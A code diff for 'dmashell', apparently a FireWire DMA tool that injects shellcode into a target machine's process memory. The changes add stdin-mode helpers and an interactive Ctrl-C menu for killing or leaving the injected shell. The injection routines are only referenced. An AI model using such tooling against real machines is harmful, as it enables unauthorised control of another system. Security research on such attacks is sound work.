@@ -208,10 +208,59 @@ uint32_t try_inject(linear_handle lin, addr_t pagedir, char *injectcode, int inj
 
 volatile int do_terminate = 0;
 
+void set_blocking_stdin()
+{
+	int flags;
+	// set STDIN to blocking.
+	flags = fcntl(STDIN_FILENO, F_GETFL);
+	flags -= O_NONBLOCK;
+	fcntl(STDIN_FILENO, F_SETFL, flags);
+}
+
+void set_nonblocking_stdin()
+{
+	int flags;
+	// set STDIN to non-blocking.
+	flags = fcntl(STDIN_FILENO, F_GETFL);
+	flags |= O_NONBLOCK;
+	fcntl(STDIN_FILENO, F_SETFL, flags);
+}
+
 void handle_sigint(int __attribute__ ((__unused__)) signal)
 {{{
-	printf(TERM_YELLOW "\n(dmashell)" TERM_RESET " received SIGINT. telling shellcode to kill the child...\n");
-	do_terminate = 1;
+	set_blocking_stdin();
+	printf(TERM_YELLOW "\n(dmashell)" TERM_RESET " received SIGINT. telling shellcode to kill the child...\n"
+	       TERM_YELLOW "(dmashell)" TERM_RESET " use SIGQUIT (CTRL-\\) at any time to terminate process without any further writing\n"
+	       TERM_YELLOW "(dmashell)" TERM_RESET " press enter to just continue\n"
+	       TERM_YELLOW "(dmashell)" TERM_RESET " press k to tell shellcode to send a SIGKILL to the shell\n"
+	       TERM_YELLOW "(dmashell)" TERM_RESET " press q to terminate dmashell NOW\n"
+	      );
+
+	switch (getchar()) {
+		case 'q':
+		case 'Q':
+			printf(TERM_YELLOW "(dmashell)" TERM_RESET " terminating " TERM_RED "NOW" TERM_RESET "\n");
+			exit(0);
+			break;
+		case 'k':
+		case 'K':
+			do_terminate = 1;
+			break;
+/*
+		case 's':
+		case 'S':
+			// rescan for to-be-attacked process?
+			break;
+		case 'f':
+		case 'F':
+			// rescan raw1394 bus for attack-target
+			break;
+*/
+		default:
+			printf(TERM_YELLOW "(dmashell)" TERM_RESET " unknown command. skipping back to interactive shellcode\n");
+			break;
+	}
+	set_nonblocking_stdin();
 }}}
 
 void use_shell(linear_handle lin, uint32_t base)
@@ -251,11 +300,8 @@ void use_shell(linear_handle lin, uint32_t base)
 #define ACK_child_is_dead linear_write_in_page(lin, base + CHILD_IS_DEAD, &child_is_dead, 1)
 #define DO_terminate_child linear_write_in_page(lin, base + TERMINATE_CHILD, &true_value, 1)
 
-	int flags;
+	set_nonblocking_stdin();
 	// set STDIN to non-blocking.
-	flags = fcntl(STDIN_FILENO, F_GETFL);
-	flags |= O_NONBLOCK;
-	fcntl(STDIN_FILENO, F_SETFL, flags);
 
 	printf(TERM_YELLOW "(dmashell)" TERM_RESET " rfrm_writer_pos is @0x%08x (offset 0x%03x).\n", base + RFRM_WRITER_POS, RFRM_WRITER_POS);
 
@@ -306,11 +352,7 @@ void use_shell(linear_handle lin, uint32_t base)
 	// FIXME: we should only do this, if the process exists. we need to test this!
 	ACK_child_is_dead;
 
-	// set STDIN back to blocking.
-	flags = fcntl(STDIN_FILENO, F_GETFL);
-	flags -= O_NONBLOCK;
-	fcntl(STDIN_FILENO, F_SETFL, flags);
-
+	set_blocking_stdin();
 }}}
 
 void usage(char* argv0)
